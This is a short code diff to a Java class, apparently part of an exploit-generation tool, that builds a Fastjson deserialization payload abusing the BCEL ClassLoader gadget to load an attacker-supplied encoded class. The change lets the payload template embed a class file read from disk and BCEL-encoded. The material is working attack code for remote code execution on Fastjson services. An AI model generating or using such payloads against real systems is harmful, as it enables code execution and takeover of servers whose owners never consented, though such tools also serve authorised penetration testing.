@@ -1,6 +1,10 @@
 package com.ding0x0.fastjson;
 
 import com.ding0x0.Payload;
+import com.ding0x0.utils.BCEL;
+import com.ding0x0.utils.Stream;
+
+import java.io.IOException;
 
 public class bcelPayload extends Payload {
 
@@ -14,7 +18,7 @@ public class bcelPayload extends Payload {
             "                   \"driverClassLoader\":{\n" +
             "                       \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
             "                   },\n" +
-            "                   \"driverClassName\":\"$$BCEL$$\"\n" +
+            "                   \"driverClassName\":\"%s\"\n" +
             "               }\n" +
             "           }\n" +
             "       }:\"x\"\n" +
@@ -29,10 +33,10 @@ public class bcelPayload extends Payload {
     }
 
     @Override
-    public String format(){
+    public String format() throws IOException {
         if (this.bcel.equals("")) {
-            return this.template;
+            return String.format(this.template, "$$BCEL$$");
         }
-        return String.format(this.template, this.bcel);
+        return String.format(this.template, BCEL.encode(Stream.F2B(this.bcel)));
     }
 }
